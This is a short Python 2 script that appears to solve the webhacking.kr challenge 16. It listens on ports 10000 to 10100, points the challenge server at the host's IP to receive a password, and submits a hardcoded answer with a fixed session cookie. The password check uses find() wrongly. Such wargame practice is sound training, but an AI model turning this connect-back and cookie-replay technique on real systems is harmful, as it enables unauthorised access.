#-*- coding: utf-8 -*-
import socket
import sys
import threading
import urllib
import urllib2
import time
import CookieManager

ipAddress = ""
httpConnection = None
print "[+] Find IP Address"
try:
    httpRequest = urllib2.Request("https://api.ipify.org")
    httpConnection = urllib2.urlopen(httpRequest)
    ipAddress = httpConnection.read()
    print "[*] Your IP Address is [", ipAddress, "]"
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()

def getPassword(portNumber):
    serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serverSocket.bind(('', portNumber))
    serverSocket.listen(1)
    conn, _ = serverSocket.accept()
    while True:
        time.sleep(1)
        data = conn.recv(4096)
        if data.find('Password'):
            print data
            challengeUrl = "http://webhacking.kr/index.php?mode=auth_go"
            parameter = urllib.urlencode({
                "answer": "38b4436dc68588052e60316619b33969"
            });
            httpRequest = urllib2.Request(challengeUrl, data=parameter)
            httpRequest.add_header("Cookie", CookieManager.getCookie())
            httpRequest.get_method = lambda: 'POST'
            
            httpConnection = None
            try:
                httpConnection = urllib2.urlopen(httpRequest)
                httpResponse = httpConnection.read()
                print httpResponse
            except:
                raise
            finally:
                if httpConnection != None:
                    httpConnection.close()
            sys.exit(0)
    
    if serverSocket != None:
        serverSocket.close()

print "[+] Listen Ports 10000 ~ 10100"
for portNumber in range(10000, 10101):
    sys.stdout.write(".")
    time.sleep(0.2)
    t = threading.Thread(target=getPassword, args=(portNumber, ))
    t.start()
print

challengeUrl = "http://webhacking.kr/challenge/web/web-16/?server=" + ipAddress
CookieManager.addCookie("PHPSESSID", "a90f69bdc1cdceaf479ca1ebcd368d29")
httpRequest = urllib2.Request(challengeUrl)
httpRequest.add_header("Cookie", CookieManager.getCookie())

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
    
